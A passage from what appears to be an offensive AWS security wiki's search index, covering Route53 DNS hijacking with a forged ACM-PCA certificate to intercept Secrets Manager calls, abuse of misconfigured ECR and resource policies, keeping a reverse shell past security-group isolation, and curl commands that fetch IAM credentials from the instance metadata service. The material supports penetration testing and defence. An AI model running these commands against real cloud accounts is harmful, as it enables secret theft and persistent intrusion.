adversary setting the secretsmanager.us-east-1.amazonaws.com domain to an IP controlled by the adversary. The following creates the private hosted zone for secretsmanager.us-east-1.amazonaws.com: <pre><code>aws route53 create-hosted-zone --name secretsmanager.us-east-1.amazonaws.com --caller-reference sm4 --hosted-zone-config PrivateZone=true --vpc VPCRegion=us-east-1,VPCId=&lt;VPCId&gt;\n</code></pre></p> <p>Then set the A record for secretsmanager.us-east-1.amazonaws.com in this private hosted zone. Use the following POST body payload - mitm.json:</p> <pre><code>{\n  \"Comment\": \"&lt;anything&gt;\",\n  \"Changes\": [{\n    \"Action\": \"UPSERT\",\n    \"ResourceRecordSet\": {\n      \"Name\": \"secretsmanager.us-east-1.amazonaws.com\",\n      \"Type\": \"A\",\n      \"TTL\": 0,\n      \"ResourceRecords\": [{\"Value\": \"&lt;ip_of_adversary_instance_in_the_VPC&gt;\"}]\n    }\n  }]\n}\n</code></pre> <p>One set TTL to 0 to avoid DNS caching. Then, the advisory uses this payload to change-resource-record-sets: <pre><code>aws route53 change-resource-record-sets --hosted-zone-id &lt;id_returned_by_previous_API_call&gt; --change-batch file://mitm.json\n</code></pre></p> <p>Now, the adversary must generate the CSR and send it for signing to the ACM-PCA, CSR and private key can be generated with OpenSSL: <pre><code>openssl req -new -newkey rsa:2048 -nodes -keyout your_domain.key -out your_domain.csr\n</code></pre></p> <p>For CN (Common Name), one must provide secretsmanager.us-east-1.amazonaws.com. Then one sends the CSR to acm-pca to issue the certificate: <pre><code>aws acm-pca issue-certificate --certificate-authority-arn \"&lt;arn_of_ca_used_within_vpc&gt;\" --csr file://your_domain.csr --signing-algorithm SHA256WITHRSA --validity Value=365,Type=\"DAYS\" --idempotency-token 1234\n</code></pre></p> <p>It returns the signed certificate ARN in the response. The next call is to fetch the certificate.</p> <pre><code>aws acm-pca get-certificate --certificate-arn \"&lt;cert_arn_from_previous_response&gt;\" --certificate-authority-arn \"&lt;arn_of_ca_used_within_vpc&gt;\"\n</code></pre> <p>Once one got the signed certificate on the disk as cert.crt, the adversary starts the listener or 443/TCP and sniffs the calls to the secretsmanager.us-east-1.amazonaws.com <pre><code>sudo ncat --listen -p 443 --ssl --ssl-cert cert.crt --ssl-key your_domain.key -v\n</code></pre></p> <p>The calls can be then forwarded to the Secrets Manager VPCE to for example GetSecretValue and get unauthorized access to the data. The same action can be done with any AWS API called from the VPC - S3, KMS, etc.</p>","location":"aws/exploitation/route53_modification_privilege_escalation/"},{"title":"Misconfigured Resource-Based Policies","text":"<p>Resource-based policies are an often overlooked part of AWS security that can have significant implications. A resource-based policy is a type of policy that is attached directly to an AWS resource that describes what actions can be performed on it and by whom. </p> <p>For example, the following is a bucket policy (a type of resource-based policy) that would permit the <code>tester</code> user to list the contents of the <code>super-public-fun-bucket</code> S3 bucket.</p> <pre><code>{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Sid\": \"AllowS3Listing\",\n            \"Effect\": \"Allow\",\n            \"Principal\": {\n                \"AWS\": \"arn:aws:iam::111111111111:user/tester\"\n            },\n            \"Action\": \"s3:ListBucket\",\n            \"Resource\": \"arn:aws:s3:::super-public-fun-bucket\"\n        }\n    ]\n}\n</code></pre> <p>Resource-based policies make it easy to share AWS resources across AWS accounts. They also, as a result, make it easy to unintentionally share resources. The common example of this is misconfigured S3 buckets which leak sensitive information. </p> <p>For a Penetration Tester or Red Teamer it is important to understand the intricacies of how resource-based policies work, and how they can be abused.</p>","location":"aws/exploitation/Misconfigured_Resource-Based_Policies/"},{"title":"The \u201c*\u201d Principal and Risks","text":"<p>In a resource-based policy you must specify a \u201cprincipal\u201d. This is the entity who is allowed (or denied) the ability to perform the action. It is possible to specify \u201c*\u201d as a principal which means that all users will be able to act on it. This effectively makes the resource public and anyone can perform actions against it.</p> <p>For a real world example of this, a telecommunications company had the following bucket policy set.</p> <pre><code>{\n  \"Sid\": \"AllowPublicRead\",\n  \"Effect\": \"Allow\",\n  \"Principal\": {\n    \"AWS\": \"*\"\n  },\n  \"Action\": [\n    \"s3:GetObject\",\n    \"s3:PutObject\"\n  ],\n  \"Resource\": \"arn:aws:s3:::media.tellacom.com/taskrouter/*\"\n}\n</code></pre> <p>The bucket this policy was attached to was used to distribute a JavaScript SDK, which would be a valid use-case for a public S3 bucket. As can be seen from the <code>Action</code> statement, the policy permitted both <code>s3:GetObject</code> and <code>s3:PutObject</code>. This enabled an attacker to overwrite the JavaScript SDK sitting in the bucket with malicious code. This code was then distributed from the legitimate bucket.</p> <p>While resource-based policy misconfigurations are often associated with leaking information (read), it is equally as dangerous that an adversary could modify (write to) the resource(s).</p>  <p>Note</p> <p>Condition operators can be used to scope down the policy. For example, the principal can be set to \u201c*\u201d but the conditions can enforce which account can perform an action. It is important to thoroughly read the policy and understand the context before creating a finding for it. </p>","location":"aws/exploitation/Misconfigured_Resource-Based_Policies/#the-principal-and-risks"},{"title":"More Than Just S3 Buckets","text":"<p>It is worth noting that there are many different AWS services/resources which make use of resource-based policies. Each service will have its own security implications based on what the principal is and what the actions are. </p>  <p>Note</p> <p>Prowler, an AWS assessment tool, can be used to quickly audit resource policies in an AWS account. Be mindful that it cannot contextualize all condition operators, and how they affect the account\u2019s security.</p>","location":"aws/exploitation/Misconfigured_Resource-Based_Policies/#more-than-just-s3-buckets"},{"title":"Resource-Based Policy Evaluation Logic","text":"<p>It is important to note that resource-based policies have a unique quirk when it comes to policy evaluation logic. From the documentation, \u201cDepending on the type of principal, an Allow in a resource-based policy can result in a final decision of Allow, even if an implicit deny in an identity-based policy, permissions boundary, or session policy is present [within the same account]\u201d.</p>  <p>Note</p> <p>An <code>implicit</code> deny is when there is no specific <code>Deny</code> statement, but there is also no <code>Allow</code> statement in a policy. You can think of an implicit deny as the starting point of a policy. Everything is denied by default and access has to be granted.</p> <p>An <code>explicit</code> deny is when there is a specific <code>Deny</code> statement in a policy. </p> <p>More information can be found in the documentation for the difference between explicit and implicit denies.</p>  <p>This means that if there is an <code>Allow</code> in a resource policy, that entity can perform actions on the resource without an associated identity policy. Take the following SNS topic access policy (a form of resource-based policy) for example:</p> <p><pre><code>{\n  \"Version\": \"2008-10-17\",\n  \"Id\": \"__default_policy_ID\",\n  \"Statement\": [\n    {\n      \"Sid\": \"__default_statement_ID\",\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"arn:aws:iam::111111111111:user/tester\"\n      },\n      \"Action\": [\n        \"SNS:GetTopicAttributes\",\n        \"SNS:SetTopicAttributes\"\n      ],\n      \"Resource\": \"arn:aws:sns:us-east-1:111111111111:test_topic\"\n    }\n  ]\n}\n</code></pre> This policy would permit the <code>tester</code> IAM user to perform <code>sns:GetTopicAttributes</code> and <code>sns:SetTopicAttributes</code> without the need for an <code>Allow</code> in the identity policies attached to the user.</p>  <p>Note</p> <p>This behavior only applies to entities in the same AWS account. If the resource-based policy specified an IAM user in a different AWS account, that user would need to have an identity policy attached that allowed the action.</p>","location":"aws/exploitation/Misconfigured_Resource-Based_Policies/#resource-based-policy-evaluation-logic"},{"title":"\u201cNot\u201d Policy Elements","text":"<p>Within the syntax for IAM policies in AWS exist three \u201cNot\u201d policy elements, NotPrincipal, NotAction, and NotResource. These elements have the inverse effect of their similarly named counterparts and, when paired with an <code>Allow</code>, can be a very serious misconfiguration.</p> <p>Because of this, policies which include these elements should be strictly scrutinized for potential misconfigurations.</p>","location":"aws/exploitation/Misconfigured_Resource-Based_Policies/#not-policy-elements"},{"title":"NotPrincipal","text":"<p>The NotPrincipal element is used to specify which entity is not a part of the policy. When paired with an <code>Allow</code> this means that all entities (including those outside of the account) will be permitted to perform actions against the resource.</p> <p>For example, the following SNS access policy would permit any entity to perform <code>sns:GetTopicAttributes</code> except for the <code>jim</code> user.</p> <pre><code>{\n  \"Version\": \"2008-10-17\",\n  \"Id\": \"__default_policy_ID\",\n  \"Statement\": [\n    {\n      \"Sid\": \"__default_statement_ID\",\n      \"Effect\": \"Allow\",\n      \"NotPrincipal\": {\n        \"AWS\": \"arn:aws:iam::111111111111:user/jim\"\n      },\n      \"Action\": \"SNS:GetTopicAttributes\",\n      \"Resource\": \"arn:aws:sns:us-east-1:111111111111:test_topic\"\n    }\n  ]\n}\n</code></pre>","location":"aws/exploitation/Misconfigured_Resource-Based_Policies/#notprincipal"},{"title":"NotAction","text":"<p>The NotAction element is used to specify all actions except the specified one. When paired with an <code>Allow</code> this means that all actions except the ones specified will be permitted. </p> <p>For example, the following SNS access policy would permit any entity the ability to perform all SNS actions except <code>sns:Publish</code>.</p> <pre><code>{\n  \"Version\": \"2008-10-17\",\n  \"Id\": \"__default_policy_ID\",\n  \"Statement\": [\n    {\n      \"Sid\": \"__default_statement_ID\",\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"*\"\n      },\n      \"NotAction\": \"SNS:Publish\",\n      \"Resource\": \"arn:aws:sns:us-east-1:111111111111:test_topic\"\n    }\n  ]\n}\n</code></pre>","location":"aws/exploitation/Misconfigured_Resource-Based_Policies/#notaction"},{"title":"NotResource","text":"<p>The NotResource element is used to specify all resources except the specified one. When paired with an <code>Allow</code> this means that if the resource is incorrect, or mistyped, the statement will evaluate to true.</p> <p>For example, the following SNS access policy for an SNS topic named <code>first_topic</code> would permit the user <code>jim</code> the ability to perform the <code>sns:GetTopicAttributes</code> action because the statement specifies a <code>NotResource</code> element of <code>second_topic</code>.</p> <pre><code>{\n  \"Version\": \"2008-10-17\",\n  \"Id\": \"__default_policy_ID\",\n  \"Statement\": [\n    {\n      \"Sid\": \"__default_statement_ID\",\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"arn:aws:iam::222222222222:user/jim\"\n      },\n      \"Action\": \"SNS:GetTopicAttributes\",\n      \"NotResource\": \"arn:aws:sns:us-east-1:111111111111:second_topic\"\n    }\n  ]\n}\n</code></pre>","location":"aws/exploitation/Misconfigured_Resource-Based_Policies/#notresource"},{"title":"Abusing Misconfigured ECR Resource Policies","text":"<p>AWS Elastic Container Registry (ECR) private repositories use resource-based policies to delineate which entities are permitted to push and pull containers. As a result, it is possible for these policies to be misconfigured and potentially abused. The following are some examples of possible misconfigurations and the required permissions needed to take advantage of them.</p>  <p>Note</p> <p>Aside from the wildcard principal, you should also be mindful of overbroad permissions in general, such as permitting an entire AWS account to have access.</p>","location":"aws/exploitation/Misconfigured_Resource-Based_Policies/misconfigured_ecr_resource_policy/"},{"title":"Understanding ecr:GetAuthorizationToken","text":"<p>A unique requirement to abusing misconfigured resource-based policies in ECR is ecr:GetAuthorizationToken. The attacking entity must have this permission via an identity-based policy, it cannot be permitted via a resource-based policy (even if the <code>Action</code> element is <code>ecr:*</code>). For scenarios in which the policy has a wildcard principal and a broken policy, this is not a problem as you can create a role with the needed permission.</p>  <p>Note</p> <p>When interacting with an ECR private repository via the Docker cli, you use ecr:GetLoginPassword to authenticate. This calls <code>ecr:GetAuthorizationToken</code> to provide the needed authorization.</p>","location":"aws/exploitation/Misconfigured_Resource-Based_Policies/misconfigured_ecr_resource_policy/#understanding-ecrgetauthorizationtoken"},{"title":"Downloading Containers","text":"<p>Required Permissions: ecr:GetLoginPassword, ecr:BatchGetImage, ecr:GetDownloadURLForLayer.</p> <p>As an example, take the following misconfigured resource policy for an ECR private repository.</p> <pre><code>{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"AllowAll\",\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"*\"\n      },\n      \"Action\": [\n        \"ecr:BatchGetImage\",\n        \"ecr:GetDownloadUrlForLayer\"\n      ]\n    }\n  ]\n}\n</code></pre> <p>This policy would permit us the ability to download containers from the vulnerable repository to our own account. We can take advantage of this with the following commands. First, we need to authenticate to the repository.</p> <pre><code>aws ecr get-login-password --region &lt;region&gt; | docker login --username AWS --password-stdin &lt;account ID&gt;.dkr.ecr.&lt;region&gt;.amazonaws.com\n</code></pre> <p>Next, we will pull the container with the following command.</p> <pre><code>docker pull &lt;account ID&gt;.dkr.ecr.&lt;region&gt;.amazonaws.com/&lt;repository name&gt;:vulnerable\n</code></pre> <p>We can now loot this container for source code or other valuable information.</p>","location":"aws/exploitation/Misconfigured_Resource-Based_Policies/misconfigured_ecr_resource_policy/#downloading-containers"},{"title":"Uploading Containers","text":"<p>Required Permissions: ecr:GetLoginPassword, ecr:InitiateLayerUpload, ecr:UploadLayerPart, ecr:BatchCheckLayerAvailability, ecr:CompleteLayerUpload, ecr:PutImage.</p>  <p>Info</p> <p>As an anecdotal aside, the number of permissions required to perform a container upload may inadvertently increase the likelihood of a <code>Principal</code> being set to <code>*</code>. If you're a developer or ops person just trying to get something done, it may be enticing to set it to a wildcard and be done with it/forget about it.</p>  <p>As an example, take the following misconfigured resource policy for an ECR private repository.</p> <pre><code>{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"ExamplePolicy\",\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"*\"\n      },\n      \"Action\": \"ecr:*\"\n    }\n  ]\n}\n</code></pre> <p>This policy would permit us the ability to upload containers to the repository from our own account. We can take advantage of this with the following commands. First, we need to authenticate to the repository.</p> <pre><code>aws ecr get-login-password --region &lt;region&gt; | docker login --username AWS --password-stdin &lt;account ID&gt;.dkr.ecr.&lt;region&gt;.amazonaws.com\n</code></pre> <p>Next, we need to create/choose a container to upload. In a real world scenario you would likely want to create a container which runs your C2 of choice, or perhaps a simple script to retrieve IAM credentials. For this example, we will use an Ubuntu container.</p> <pre><code>docker tag ubuntu:latest &lt;account ID&gt;.dkr.ecr.&lt;region&gt;.amazonaws.com/&lt;repository name&gt;:vulnerable\n</code></pre> <p>And finally we push the container into the repository.</p> <pre><code>docker push &lt;account ID&gt;.dkr.ecr.&lt;region&gt;.amazonaws.com/&lt;repository name&gt;:vulnerable\n</code></pre> <p>Now we simply have to wait for a service (ECS, EKS, EC2, Lambda, etc.) to pull this malicious container and execute it, giving us access to that environment.</p>","location":"aws/exploitation/Misconfigured_Resource-Based_Policies/misconfigured_ecr_resource_policy/#uploading-containers"},{"title":"Identification","text":"<p>To find exposed ECR private repositories you can use Prowler, an open source tool to audit for AWS security. The following command can be used with version 3.0 or higher.</p> <pre><code>./prowler -c ecr_repositories_not_publicly_accessible\n                         _\n _ __  _ __ _____      _| | ___ _ __\n| '_ \\| '__/ _ \\ \\ /\\ / / |/ _ \\ '__|\n| |_) | | | (_) \\ V  V /| |  __/ |\n| .__/|_|  \\___/ \\_/\\_/ |_|\\___|_|v3.0-beta-21Nov2022\n|_| the handy cloud security tool\n\nDate: 2022-11-26 19:12:03\n\nThis report is being generated using credentials below:\n\nAWS-CLI Profile: [default] AWS Filter Region: [all]\nAWS Account: [000000000000] UserId: [AROAQQPLEQBZZHQGGAQ55:Nick]\nCaller Identity ARN: [arn:aws:sts::000000000000:assumed-role/snip/Nick]\n\nExecuting 1 checks, please wait...\n\n-&gt; Scan is completed! |\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589\u2589| 1/1 [100%] in 4.5s \n\nOverview Results:\n\u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e\n\u2502 100.0% (1) Failed \u2502 0.0% (0) Passed \u2502\n\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f\n\nAccount 009619941490 Scan Results (severity columns are for fails only):\n\u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e\n\u2502 Provider   \u2502 Service   \u2502 Status   \u2502   Critical \u2502   High \u2502   Medium \u2502   Low \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 aws        \u2502 ecr       \u2502 FAIL (1) \u2502          1 \u2502      0 \u2502        0 \u2502     0 \u2502\n\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f\n</code></pre>  <p>Note</p> <p><code>Condition</code> elements may induce false positives.</p>","location":"aws/exploitation/Misconfigured_Resource-Based_Policies/misconfigured_ecr_resource_policy/#identification"},{"title":"AWS Organizations Defaults","text":"<p>Almost all mid-to-large sized AWS environments make use of multi-account architecture. Using multiple AWS accounts offers a number of benefits and is considered a best practice. To help organize and manage those accounts, AWS offers a service called AWS Organizations.</p> <p>Due to the ubiquity of AWS Organizations, it is important for Penetration Testers and Red Teamers to familiarize themselves with its default configuration. </p> <p>When an account creates an organization it becomes the management account of that organization. Each organization has one management account, and this account effectively \"owns\" the organization.</p>","location":"aws/general-knowledge/aws_organizations_defaults/"},{"title":"Member Accounts and the OrganizationAccountAccessRole","text":"<p>When an account is created with AWS Organizations it is considered a member of the organization (hence, member account). As a part of this account creation process, AWS Organizations will create a role in the member account called <code>OrganizationAccountAccessRole</code>. This role is created in each member account.</p> <p>By default, the <code>OrganizationAccountAccessRole</code> has the <code>AdministratorAccess</code> policy attached to it, giving the role complete control over the member account. In addition, the default trust policy on the role is as shown below where <code>000000000000</code> is the account ID of the management account.</p> <pre><code>{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Effect\": \"Allow\",\n            \"Principal\": {\n                \"AWS\": \"arn:aws:iam::000000000000:root\"\n            },\n            \"Action\": \"sts:AssumeRole\"\n        }\n    ]\n}\n</code></pre> <p>These things combined mean that, should an attacker compromise the management account, the default behavior of AWS Organizations provides a path to compromise every account in the organization as an administrator. For offensive security professionals, identifying paths into the management account can be an incredibly fruitful exercise, and may result in an entire organization compromise.</p> <p>For defensive security teams, it would be a good idea to ensure no infrastructure is deployed into the management account to reduce attack surface. Additionally, carefully controlling who has access to it and monitoring that access would also help to reduce risk.</p>","location":"aws/general-knowledge/aws_organizations_defaults/#member-accounts-and-the-organizationaccountaccessrole"},{"title":"Connection Tracking","text":"<p>Security Groups in AWS have an interesting capability known as Connection Tracking. This allows the security groups to track information about the network traffic and allow/deny that traffic based on the Security Group rules.</p> <p>There are two kinds of traffic flows; tracked and untracked. For example the AWS documentation mentions a tracked flow as the following, \"if you initiate an ICMP ping command to your instance from your home computer, and your inbound security group rules allow ICMP traffic, information about the connection (including the port information) is tracked. Response traffic from the instance for the ping command is not tracked as a new request, but rather as an established connection and is allowed to flow out of the instance, even if your outbound security group rules restrict outbound ICMP traffic\".</p> <p>An interesting side effect of this is that tracked connections are allowed to persist, even after a Security Group rule change. </p> <p>Let's take a simple example: There is an EC2 instance that runs a web application. This EC2 instance has a simple Security Group that allows SSH, port 80, and port 443 inbound, and allows all traffic outbound. This EC2 instance is in a public subnet and is internet facing.</p>  <p></p>  <p>While performing a penetration test you've gained command execution on this EC2 instance. In doing so, you pop a simple reverse shell. You work your magic on the box before eventually triggering an alert to our friendly neighborhood defender. They follow their runbooks which may borrow from the official AWS whitepaper on incident response. </p> <p>As part of the \"Isolate\" step, the typical goal is to isolate the affected EC2 instance with either a restrictive Security Group or an explicit Deny NACL. The slight problem with this is that NACLs affect the entire subnet, and if you are operating in a space with a ton of EC2 instances the defender is unlikely to want to cause an outage for all of them. As a result, swapping the Security Group is the recommended procedure.</p> <p>The defender switches the Security Group from the web and ssh one, to one that does not allow anything inbound or outbound.</p>  <p></p>  <p>The beauty of connection tracking is that because you've already established a connection with your shell, it will persist. So long as you ran the shell before the SG change, you can continue scouring the box and looking for other vulnerabilities.</p>  <p></p>  <p>To be clear, if the restrictive security group doesn't allow for any outbound rules we won't be able to communicate out (and if you're using a beaconing C2 that will not function).</p>  <p></p>","location":"aws/general-knowledge/connection-tracking/"},{"title":"Create a Console Session from IAM Credentials","text":"<ul> <li> <p> Tools mentioned in this article</p>  <p>aws-vault: A vault for securely storing and accessing AWS credentials in development environments.</p> <p>leapp: Leapp is the DevTool to access your cloud.</p> </li> </ul>  <p>When performing an AWS assessment you will likely encounter IAM credentials. These credentials can be used with the AWS CLI or other tooling to query the AWS API. </p> <p>While this can be useful, sometimes you just can't beat clicking around the console. If you have IAM credentials, there is a way that you can spawn an AWS Console session using a tool such as aws-vault. This can make certain actions much easier rather than trying to remember the specific flag name for the AWS CLI.</p>  <p>Note</p> <p>If you are using temporary IAM credentials (ASIA...), for example, from an EC2 instance, you do not need to have any special IAM permissions to do this. If you are using long-term credentials (AKIA...), you need to have either sts:GetFederationToken or sts:AssumeRole permissions. This is to generate the temporary credentials you will need.</p>   <p>Tip</p> <p>If you are attempting to avoid detection, this technique is not recommended. Aside from the suspicious <code>ConsoleLogin</code> CloudTrail log, and the odd user-agent (Why is the IAM role associated with the CI/CD server using a Firefox user-agent string?), you will also generate a ton of CloudTrail logs.</p>  <p>To start, export the relevant environment variables for the IAM credentials you have. Next, install aws-vault.</p> <p>From here, perform the following commands depending on the type of credentials you have.</p>","location":"aws/general-knowledge/create_a_console_session_from_iam_credentials/"},{"title":"User Credentials","text":"<p>For long-term credentials (Those starting with AKIA), there is an extra step that must be completed first. You will need to generate temporary credentials to retrieve the sign in token. To do this, we will make use of sts:GetFederationToken. As an alternative, sts:AssumeRole can also be used.</p> <pre><code>aws sts get-federation-token --name blah\n</code></pre> <p>This will return temporary IAM credentials that you can use with the next step.</p>","location":"aws/general-knowledge/create_a_console_session_from_iam_credentials/#user-credentials"},{"title":"STS Credentials","text":"<p>For short-term credentials (Those starting with ASIA), you can run the following command:</p> <pre><code>aws-vault login\n</code></pre>  <p>Tip</p> <p>If you'd like to generate a link without it automatically opening a new tab in your browser you can use the <code>-s</code> flag and it will be printed to stdout.</p>  <p>To learn more about custom identity broker access to the AWS Console please see the official documentation.</p>","location":"aws/general-knowledge/create_a_console_session_from_iam_credentials/#sts-credentials"},{"title":"IAM ID Identifiers","text":"<p>Source</p>    Prefix Entity Type     ABIA AWS STS service bearer token   ACCA Context-specific credential   AGPA Group   AIDA IAM user   AIPA Amazon EC2 instance profile   AKIA Access key   ANPA Managed policy   ANVA Version in a managed policy   APKA Public key   AROA Role   ASCA Certificate   ASIA Temporary (AWS STS) keys","location":"aws/general-knowledge/iam-key-identifiers/"},{"title":"Introduction to the Instance Metadata Service","text":"<p>Every EC2 instance has access to the instance metadata service (IMDS) that contains metadata and information about that specific EC2 instance. In addition, if an IAM Role is associated with the EC2 instance, credentials for that role will be in the metadata service. Because of this, the instance metadata service is a prime target for attackers who gain access to an EC2 instance.</p>","location":"aws/general-knowledge/intro_metadata_service/"},{"title":"How to Access the Metadata Service","text":"<p>The metadata service can be accessed at <code>http://169.254.169.254/latest/meta-data/</code> from the EC2 instance. Alternatively, it can also be reached via IPv6 at <code>http://[fd00:ec2::254]/latest/meta-data/</code> however this only applies to Nitro EC2 instances.</p> <p>To get credentials, you will first need to make a request to <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>. The response to this will return the name of the IAM role associated with the credentials. You then make a subsequent request to retrieve the IAM credentials at <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/*role_name*/</code>. </p>","location":"aws/general-knowledge/intro_metadata_service/#how-to-access-the-metadata-service"},{"title":"IMDSv2","text":"<p>Version two of the metadata service has added protections against SSRF and requires the user to create and use a token. You can access it via the following.</p> <pre><code>user@host:~$ TOKEN=`curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"`\nuser@host:~$ curl -H \"X-aws-ec2-metadata-token: $TOKEN\" -v http://169.254.169.254/latest/meta-data/\n</code></pre>","location":"aws/general-knowledge/intro_metadata_service/#imdsv2"},{"title":"The Security Benefits of IMDSv2","text":"<p>IMDSv2 offers a number of security improvements over the original. Wherever possible, IMDSv2 should be enforced over the original metadata service. These improvements take the following form:</p> <p>Session Authentication: In order to retrieve information from the metadata service a session must be created by sending a HTTP PUT request to retrieve a token value. After this, the token must be used for all subsequent requests. This mechanism effectively mitigates traditional Server Side Request Forgery attacks, as an attacker is unlikely to be able to send a PUT request.</p> <p>Blocks X-Forwarded-For Header: IMDSv2 will block requests to fetch a token that include the X-Forwarded-For header. This is to prevent misconfigured reverse proxies from being able to access it.</p> <p>TTL of 1: The default configuration of IMDSv2 is to set the Time To Live (TTL) of the TCP packet containing the session token to \"1\". This ensures that misconfigured network appliances (firewalls, NAT devices, routers, etc.) will not forward the packet on. This also means that Docker containers using the default networking configuration (bridge mode) will not be able to reach the instance metadata service.</p>  <p>Note</p> <p>While the default configuration of IMDSv2 will prevent a Docker container from being able to reach the metadata service, this can be configured via the \"hop limit.\"</p>","location":"aws/general-knowledge/intro_metadata_service/#the-security-benefits-of-imdsv2"},{"title":"What Info the Metadata Service Contains","text":"<p>The following information was pulled from here.</p>    Endpoint Description     ami-id The AMI ID used to launch the instance.   ami-launch-index If you started more than one instance at the same time, this value indicates the order in which the instance was launched. The value of the first instance launched is 0.   ami-manifest-path The path to the AMI manifest file in Amazon S3. If you used an Amazon EBS-backed AMI to launch the instance, the returned result is unknown.   hostname The private IPv4 DNS hostname of the instance. In cases where multiple network interfaces are present, this refers to the eth0 device (the device for which the device number is 0).   iam/info If there is an IAM role associated with the instance, contains information about the last time the instance profile was updated, including the instance's LastUpdated date, InstanceProfileArn, and InstanceProfileId. Otherwise, not present.   iam/security-credentials/role-name If there is an IAM role associated with the instance, role-name is the name of the role, and role-name contains the temporary security credentials associated with the role. Otherwise, not present.   identity-credentials/ec2/info [Internal use only] Information about the credentials in identity-credentials/ec2/security-credentials/ec2-instance. These credentials are used by AWS features such as EC2 Instance Connect, and do not have any additional AWS API permissions or privileges beyond identifying the instance.   instance-id The ID of this instance.   local-hostname The private IPv4 DNS hostname of the instance. In cases where multiple network interfaces are present, this refers to the eth0 device (the device for which the device number is 0).   local-ipv4 The private IPv4 address of the instance. In cases where multiple network interfaces are present, this refers to the eth0 device (the device for which the device number is 0).   public-hostname The instance's public DNS. This category is only returned if the enableDnsHostnames attribute is set to true.   public-ipv4 The public IPv4 address. If an Elastic IP address is associated with the instance, the value returned is the Elastic IP address.   public-keys/0/openssh-key Public key. Only available if supplied at instance launch time.   security-groups The names of the security groups applied to the instance.","location":"aws/general-knowledge/intro_metadata_service/#what-info-the-metadata-service-contains"},{"title":"Introduction to User Data","text":"<p>Instance user data is used to run commands when an EC2 instance is first started or after it is rebooted (with some configuration). Because this script is typically used to install software and configure the instance, this can be an excellent source of information for us as attackers. After gaining access to an EC2 instance you should immediately grab the user data script to gain information on the environment.</p>  <p>Warning</p> <p>Although it should not be done, credentials/secrets often end up being stored in user data. From the AWS docs, \"Although you can only access instance metadata and user data from within the instance itself, the data is not protected by authentication or cryptographic methods. Anyone who has direct access to the instance, and potentially any software running on the instance, can view its metadata. Therefore, you should not store sensitive data, such as passwords or long-lived encryption keys, as user data.\"</p>","location":"aws/general-knowledge/introduction_user_data/"},{"title":"How to Access EC2 User Data","text":"<p>User data can be accessed at <code>http://169.254.169.254/latest/user-data/</code> from the EC2 instance.</p>","location":"aws/general-knowledge/introduction_user_data/#how-to-access-ec2-user-data"},{"title":"IMDSv2","text":"<p>Version two of the metadata service has added protections against SSRF and requires the user to create and use a token. You can access it via the following.</p> <pre><code>user@host:~$ TOKEN=`curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"`\nuser@host:~$ curl -H \"X-aws-ec2-metadata-token: $TOKEN\" -v http://169.254.169.254/latest/user-data/\n</code></pre>","location":"aws/general-knowledge/introduction_user_data/#imdsv2"},{"title":"API","text":"<p>Another option to gather user data is via the API. If you escalate privileges in an account, or simply compromise a user/role with sufficient 